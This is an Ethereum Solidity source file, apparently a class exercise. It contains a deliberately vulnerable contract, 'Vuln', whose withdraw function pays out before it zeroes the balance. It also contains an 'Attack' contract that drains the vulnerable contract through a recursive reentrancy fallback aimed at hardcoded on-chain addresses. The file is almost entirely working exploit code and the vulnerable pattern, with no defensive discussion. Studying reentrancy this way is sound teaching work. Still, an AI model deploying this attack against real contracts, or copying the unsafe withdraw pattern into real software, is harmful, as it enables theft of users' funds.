/**
 *Submitted for verification at Etherscan.io on 2021-12-08
*/

pragma solidity ^0.6.0;
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack {
    Vuln public v = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018)); //call instance of Vuln
    // test  vuln address: 0x69CB37CeddBE7EbA8d23c330a34595a8CfCa7a23
    // class vuln address: 0x36A540E3A78084962B75E25877CfACf8846Be018

    uint public count = 0;

    function deposit() public payable {
        // Call vuln deposit and Increment their balance with whatever they pay
        v.deposit{value: msg.value}();
    }

    function get() public {
        msg.sender.send(address(this).balance);
        count = 0;
    }

    function withdraw() public {
        // Recursively call vuln through empty "" function withdraw to increase the amount of balance
        count += 1;
        v.withdraw();
    }

    fallback () external payable {
        count += 1;
        if(count > 2){
            count = 0;
        }
        else{
            v.withdraw();
        }
    }

}